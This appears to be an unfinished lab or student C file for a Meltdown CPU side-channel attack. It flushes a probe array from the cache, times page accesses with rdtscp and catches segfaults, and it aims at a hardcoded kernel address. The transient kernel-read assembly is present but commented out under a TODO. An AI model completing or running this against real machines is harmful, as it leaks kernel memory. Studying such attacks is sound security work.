#include <stdint.h>
#include <stdio.h>

#include <emmintrin.h> /*Needed for _mm_cflush*/
#include <x86intrin.h> /*Needed for __rdtscp*/

#include <signal.h> /*Needed to catch segfault*/
#include <setjmp.h> /*Needed to jump after catching segfault*/


#define THRESHOLD_CYCLES 500


//Create 256 pages of size 4KB
char probe_array[256 * 4096];
static int histogram[256];

static sigjmp_buf env;
static void clean_exit_on_segfault()
{
    siglongjmp(env, 1); 
}


//Flush our array from the CPU cache
void flush_probe_array()
{
    for(int i = 0; i < 256; i++){
        _mm_clflush(&probe_array[i * 4096]);
    }
}


void meltdown_attack(unsigned long long kernel_address)
{

        //TODO MELTDOWN ATTACK ASSEMBLY 
        //asm volatile (
        //    "xor %%rax, %%rax\n\t"
        //    "retry:\n\t"
        //    "movb (%[address]), %%al\n\t"
        //    "shl $12, %%rax\n\t"
        //    "jz retry\n\t"
        //    "mov (%[address], %%rax, 1), %%rbx\n\t"
        //    : 
        //    : [address] "r" (kernel_address), [probe] "r" (probe_array)
        //    : "rax", "rbx"
        //);


        //asm volatile(
        //    ".rept 400000;"                
        //    "add $0x141, %%eax;"
        //    ".endr;"                    
        // 
        //    :
        //    :
        //    : "eax"
        //); 


        // Access some of the array items
        //probe_array[1*4096] = 100;
        //probe_array[2*4096] = 100;
        //char data = *(char *)kernel_address; 
        //probe_array[data * 4096] += 1;
}

static inline void get_access_time()
{
    //for(int i = 0; i < 256; i++){
    //    unsigned long long time1, time2;  
    //    unsigned junk;
    //    
    //    time1 = __rdtscp(&junk);
    //    (void)*(&probe_array[i*4096]);
    //    time2 = __rdtscp(&junk) - time1;       
    //    printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);

    //    //if(time2 - time1 <= THRESHOLD_CYCLES){
    //    //    printf("Low cycle count: %c, %d\n", i, i);
    //    //    printf("Number of cycles %lld\n", time2 - time1);
    //    //}
    //}

    unsigned junk=0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for(int i=0; i<256; i++) {
      addr = &probe_array[i*4096];
      time1 = __rdtscp(&junk);                
      (void)*addr;
      time2 = __rdtscp(&junk) - time1;       
      printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
    }


}



void predict_value()
{
    /*
     * Create function that 
     * iters each page and
     * finds out which ones
     * are below are threshhold
    */
}


int main(){


    signal(SIGSEGV, clean_exit_on_segfault);
    
    // Initialize the array
    for(int i=0; i<256; i++){
        probe_array[i*4096]=1;
    }
  
    flush_probe_array();


  
    meltdown_attack(0xffffffffc0e49000);
    
    get_access_time();


    return 1;
}

//meltdown_attack(0xffffffffc0e49000);
